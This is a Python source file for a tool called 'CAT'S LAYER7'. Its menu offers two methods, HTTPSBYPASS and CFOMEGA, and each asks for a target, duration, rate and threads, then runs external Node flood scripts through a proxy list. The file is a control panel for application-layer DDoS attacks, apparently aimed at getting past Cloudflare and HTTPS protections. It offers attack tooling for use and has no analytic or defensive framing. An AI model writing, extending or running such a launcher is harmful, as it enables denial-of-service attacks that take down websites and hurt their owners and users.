import os

def httpsb():
    target = input("root@catslayer7: target (HTTPS-BYPASS) | > ")
    time = input("root@catslayer7: time (HTTPS-BYPASS) > ")
    rate = input("root@catslayer7: rate (HTTPS-BYPASS) > ")
    thread = input("root@catslayer7: thread (HTTPS-BYPASS) > ")
    att = "node HTTP-B.js {} {} {} {} proxy.txt".format(target, time, rate, thread)
    os.system(att)


def co():
    target = input("root@catslayer7: target (CF-OMEGA) | > ")
    time = input("root@catslayer7: time (CF-OMEGA) > ")
    rate = input("root@catslayer7: rate (CF-OMEGA) > ")
    thread = input("root@catslayer7: thread (CF-OMEGA) > ")
    att = "node CF-OMEGA.js {} {} {} {} proxy.txt".format(target, time, rate, thread)
    os.system(att)

def ex():
    exit()

def ver():
    print("1.0 version")

def help():
    print()
    print("AVAILABLE COMMANDS")
    print()
    print("HELP or help")
    print("   To view all available commands")
    print("METHODS or methods")
    print("   To view available layer7 methods")
    print("VERSION or version")
    print("   To view in what version you are")
    print("EXIT or exit")
    print("   To exit this tool")


def methods():
    print()
    print("Available methods:")
    print("HTTPSBYPASS | CFOMEGA")

def cnc():
    while True:
        cmd = input("root@catslayer7: ")
        if cmd == "methods" or cmd == "METHODS":
            methods()
        elif cmd == "help" or cmd == "HELP":
            help()
        elif cmd == "version" or cmd == "VERSION":
            ver()
        elif cmd == "exit" or cmd == "EXIT":
            ex()
        elif cmd == "CFOMEGA" or cmd == "cfomega":
            co()
        elif cmd == "HTTPSBYPASS" or cmd == "httpsbypass":
            httpsb()

def linux():
    os.system("cls")
    print("""
.==============================================.
|                                              |
|                           .'\                |
|                          //  ;               |
|                         /'   |               |
|        .----..._    _../ |   \               |
|         \'---._ `.-'      `  .'               |
|          `.    '              `.             |
|            :            _,.    '.            |
|            |     ,_    (() '    |            |
|            ;   .'(().  '      _/__..-        |
|            \ _ '       __  _.-'--._          |
|            ,'.'...____'::-'  \     `'        |
|           / |   /         .---.              |
|     .-.  '  '  / ,---.   (     )             |
|    / /       ,' (     )---`-`-`-.._          |
|   : '       /  '-`-`-`..........--'\         |
|   ' :      /  /                     '.       |
|   :  \    |  .'         o             \      |
|    \  '  .' /          o       .       '     |
|     \  `.|  :      ,    : _o--'.\      |     |
|      `. /  '       ))    (   )  \>     |     |
|        ;   |      ((      \ /    \___  |     |
|        ;   |      _))      `'.-'. ,-'` '     |
|        |    `.   ((`            |/    /      |
|        \     ).  .))            '    .       |
|     ----`-'-'  `''.::.________:::mx'' ---    |
|                                              |
|                    CAT'S LAYER7              |
|           DEVELOPED BY: LazyDev@dph          |
'=============================================='
""")
    print()
    print("      type HELP to view available commands")
    print()
    cnc()

def win():
    os.system("cls")
    print("""
.==============================================.
|                                              |
|                           .'\                |
|                          //  ;               |
|                         /'   |               |
|        .----..._    _../ |   \               |
|         \'---._ `.-'      `  .'               |
|          `.    '              `.             |
|            :            _,.    '.            |
|            |     ,_    (() '    |            |
|            ;   .'(().  '      _/__..-        |
|            \ _ '       __  _.-'--._          |
|            ,'.'...____'::-'  \     `'        |
|           / |   /         .---.              |
|     .-.  '  '  / ,---.   (     )             |
|    / /       ,' (     )---`-`-`-.._          |
|   : '       /  '-`-`-`..........--'\         |
|   ' :      /  /                     '.       |
|   :  \    |  .'         o             \      |
|    \  '  .' /          o       .       '     |
|     \  `.|  :      ,    : _o--'.\      |     |
|      `. /  '       ))    (   )  \>     |     |
|        ;   |      ((      \ /    \___  |     |
|        ;   |      _))      `'.-'. ,-'` '     |
|        |    `.   ((`            |/    /      |
|        \     ).  .))            '    .       |
|     ----`-'-'  `''.::.________:::mx'' ---    |
|                                              |
|                    CAT'S LAYER7              |
|           DEVELOPED BY: LazyDev@dph          |
'=============================================='
""")
    print()
    print("      type HELP to view available commands")
    print()
    cnc()

def main():
    print(" WINDOWS | LINUX")
    user = input("What's your OS? >> ")

    if user == "WINDOWS" or user == "windows":
        win()
    if user == "LINUX" or user == "linux":
        linux()
main()